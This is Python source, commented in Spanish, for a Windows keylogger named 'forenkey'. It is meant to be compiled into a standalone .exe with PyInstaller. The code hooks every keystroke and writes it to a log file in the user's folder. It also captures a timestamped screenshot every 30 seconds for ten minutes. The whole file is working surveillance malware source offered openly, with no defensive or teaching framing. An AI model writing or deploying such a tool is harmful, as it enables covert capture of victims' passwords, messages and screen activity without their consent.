
"# forenkey" 
# genera codigo para un keylogger en python
# para ejecutarlo en windows
# se debe convertir a .exe
# con pyinstaller
# pyinstaller --onefile forenkey.py

#Use pyWinhook instead of pyHook
#pyHook is not supported in Python 3.x
#pyWinhook is supported in Python 3.x
#pyWinhook is a fork of pyHook

import pyWinhook, pythoncom, sys, logging
import os
import pyautogui

# ubica el archivo log.txt en la carpeta de este usuario

file_log = 'C:\\users\\%s\\log.txt' % os.getlogin()
#ubica el archivo log.txt en la carpeta raiz del disco C
#file_log = 'C:\\log.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
# Añade una func que guarde capturas de pantallas cada 30 segundos durante 10 minutos y guardelas en la carpeta del usuario con el nombre en formato AAAA-MM-DD-HH-MM-SS.png
# https://pyautogui.readthedocs.io/en/latest/screenshot.html#the-screenshot-function

def screenshotdateAndTime():
    screenshot = pyautogui.screenshot()
    screenshot.save('C:\\users\\%s\\%s.png' % (os.getlogin(), pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")))
    return True

now = pyautogui.datetime.datetime.now()
# 10 minutos = 600 segundos
# 30 segundos = 30 segundos
# 20 capturas de pantalla
for i in range(20):
    pyautogui.time.sleep(30)
    screenshotdateAndTime()
    print(i)


# 
def screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('C:\\users\\%s\\screenshot.png' % os.getlogin())
    return True


# crea un hook manager    
hooks_manager = pyWinhook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()


